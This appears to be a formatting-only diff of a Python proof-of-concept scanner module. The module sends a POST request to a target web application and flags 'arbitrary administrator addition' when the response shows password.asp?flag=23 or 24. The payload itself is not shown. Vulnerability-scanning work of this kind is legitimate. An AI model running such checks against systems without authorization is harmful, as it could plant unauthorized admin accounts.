@@ -42,9 +42,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -60,7 +61,7 @@ class Poc(ABPoc):
             #proxy = ('127.0.0.1', 8887)
             code, head, res, err, _ = hh.http(
                 url, header=content_type, post=post)
-            #print code, head, res
+            # print code, head, res
             # flag=23/24表示添加管理员成功
             if (code == 200 or code == 302) and ('password.asp?flag=23' in res or 'password.asp?flag=24' in res):
                 security_hole('任意添加管理员:' + url + ' POST:' + post)
